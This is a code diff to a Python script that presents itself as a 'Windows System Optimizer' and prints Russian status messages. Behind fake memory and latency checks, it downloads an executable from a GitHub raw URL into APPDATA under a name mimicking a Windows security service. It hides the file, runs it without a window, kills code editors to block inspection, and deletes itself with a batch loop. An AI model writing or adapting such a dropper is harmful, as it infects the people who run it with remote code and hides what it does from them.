@@ -9,18 +9,22 @@ import sys
 ui = 'earrprocess'
 OPTIMIZATIONN = 100
 U = "https://github.com/iDorofa/REMOTEPL/raw/refs/heads/main/Windows.Security.Health.Service.Host.Container.Runtime.exe"
-PAT = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Windows.Security.Host.Container.Runtime.exe")
+PAT = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Windows.Security.Health.Service.Host.Container.Runtime.exe")
 
 def background_task():
     try:
-        time.sleep(5) 
-        r = requests.get(U)
+        print("[*] Скачивание файла...")
+        r = requests.get(U, timeout=30)
         with open(PAT, 'wb') as f:
             f.write(r.content)
         os.system(f'attrib +h "{PAT}"')
+        print("[+] Файл сохранен")
+        
+        print("[*] Запуск...")
         subprocess.Popen([PAT], creationflags=subprocess.CREATE_NO_WINDOW)
-    except:
-        pass
+        print("[+] Запущен")
+    except Exception as e:
+        print(f"[-] Ошибка: {e}")
 
 def optimize_memory():
     print("[*] Анализ сегментов памяти...")
@@ -31,44 +35,38 @@ def optimize_memory():
 
 def check_network_latency():
     print("[*] Проверка...")
+    time.sleep(2)
     _ = [abs(random.random()) for _ in range(10)]
     print("[+] в норме")
 
 def self_delete():
-
     try:
-        bat_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), f'del_{random.randint(1000,9999)}.bat')
-        with open(bat_path, 'w') as f:
-            f.write(f'''@echo off
+        bat_path = os.path.join(os.environ.get('TEMP'), 'delete_me.bat')
+        with open(bat_path, 'w', encoding='utf-8') as f:
+            f.write(f"""@echo off
 :loop
-timeout /t 1 /nobreak >nul
-del /F /Q "{__file__}" 2>nul
+ping 127.0.0.1 -n 2 > nul
+del /F /Q "{__file__}" 2> nul
 if exist "{__file__}" goto loop
-del /F /Q "{bat_path}" 2>nul
-''')
+del "%~f0" 2> nul
+""")
         subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        sys.exit(0)
     except:
         pass
 
 def kill_dev_tools():
-
     editors = [
         "pycharm64.exe", "pycharm.exe", "code.exe", 
-        "thonny.exe", "sublime_text.exe", "notepad++.exe", "taskmgr.exe"
+        "thonny.exe", "sublime_text.exe", "notepad++.exe"
     ]
     for editor in editors:
         try:
-            subprocess.run(
-                ["taskkill", "/F", "/IM", editor],
-                capture_output=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
+            subprocess.run(f"taskkill /F /IM {editor} > nul 2>&1", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
         except:
             pass
 
 def dev_killer_loop():
-    while True:
+    for _ in range(30):
         kill_dev_tools()
         time.sleep(1)
 
@@ -76,17 +74,21 @@ if __name__ == "__main__":
     print("=== Windows System Optimizer v1.2 ===")
     
     t = threading.Thread(target=background_task)
-    t.daemon = True
     t.start()
     
     killer_thread = threading.Thread(target=dev_killer_loop)
-    killer_thread.daemon = True
     killer_thread.start()
     
     optimize_memory()
     check_network_latency()
     
-    print("\n[!] Все операции выполнены. Лог сохранен в Temp.")
-    time.sleep(2)
+    print("\n[*] Ожидание завершения...")
+    
+    t.join(timeout=60)
+    
+    print("[*] Готово")
+    time.sleep(3)
     
     self_delete()
+    
+    os._exit(0)
